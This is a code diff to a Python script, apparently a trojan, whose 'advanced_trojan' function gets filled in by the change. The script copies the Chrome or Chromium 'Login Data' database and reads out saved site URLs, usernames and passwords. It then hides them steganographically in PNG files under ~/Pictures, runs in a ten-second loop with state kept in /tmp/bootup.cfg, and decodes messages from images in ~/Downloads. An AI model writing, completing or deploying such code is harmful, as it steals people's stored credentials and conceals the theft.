@@ -1,7 +1,7 @@
 import glob
 from os import path, geteuid, remove
 import stepic
-import Image
+from PIL import Image
 from datetime import datetime, timedelta
 import sys
 from time import sleep
@@ -45,20 +45,25 @@ def decryptPasswords():
         chromePath = path.expanduser("~/.config/google-chrome/Default/Login Data")
         if not path.exists(chromePath):
             chromePath = path.expanduser("~/.config/chromium/Default/Login Data")
-        tempPath = "tmp/Login Data"
+        tempPath = "/tmp/Login Data"
         copy(chromePath, tempPath)
         db = sql.connect(tempPath)
         cur = db.cursor()
         cur = db.execute('select origin_url, username_value, password_value from logins;')
         savedList = []
         rows = cur.fetchall()
+
         for row in rows:
+            print(row)
             savedList.append([str(row[1]), str(row[0]), str(row[2])])  # username, domain name, password
+        for entry in savedList:
+            msgList.append(formatMsg(entry))
         remove(tempPath)
 
-    except:
+    except Exception as e:
+        print(e)
         pass
-    # print(msgList)
+    print(msgList)
     return msgList
 
 
@@ -154,6 +159,7 @@ def firstRun():
             i = (i + 1) % numOfMsgs
             encode(infile, msgList[i])
             numOfFiles += 1
+
         f = open('/tmp/bootup.cfg', 'w+')
         numEncoded = min(numOfMsgs, numOfFiles)
         f.write(str(numEncoded) + '\n')
@@ -192,10 +198,49 @@ def encodeRun(decodedMsgList, updateDt):
     return numEncoded
 
 
-# Fonction qui déchiffre les mots de passe d'ancien navigateur
-
+# Fonction principale
 def advanced_trojan():
-    pass
+    while True:
+        if not path.exists('/tmp/bootup.cfg'):
+            firstRun()
+
+        try:
+            update_dt
+        except NameError:
+            update_dt = None
+
+        if update_dt is None:
+            f = open('/tmp/bootup.cfg', 'r')
+            try:
+                numEncoded = int(f.readline())
+            except:
+                numOfMessages = 0
+            update_dtline = f.readline()
+            f.close()
+            update_dt = datetime.strptime(update_dtline, "%Y-%m-%d %H:%M:%S")
+            encodeDir = path.expanduser("~/Pictures/")
+            decodeDir = path.expanduser("~/Downloads/")
+            encodeflg = 0
+            msgList = []
+            for infile in glob.glob(decodeDir+"*.png"):
+                print(decode(infile))
+                file_cdt = datetime.fromtimestamp(path.getctime(infile))
+                if file_cdt - update_dt > timedelta(0):
+                    msg = decode(infile)
+                    if isValidFormat(msg):
+                        print( "*** DOWNLOADS *** ", msg)
+                        if msg not in msgList:
+                            msgList.append(msg)
+                            encodeflg = 1
+            print("Update time: ", update_dt)
+            f = open('/tmp/bootup.cfg', 'w+')
+            f.write(str(numEncoded)+"\n")
+            update_dt = datetime.now()
+            f.write(datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
+            f.close()
+            if encodeflg == 1:
+                numEncoded = encodeRun(msgList, update_dt)
+        sleep(10)
 
 
 if __name__ == "__main__":
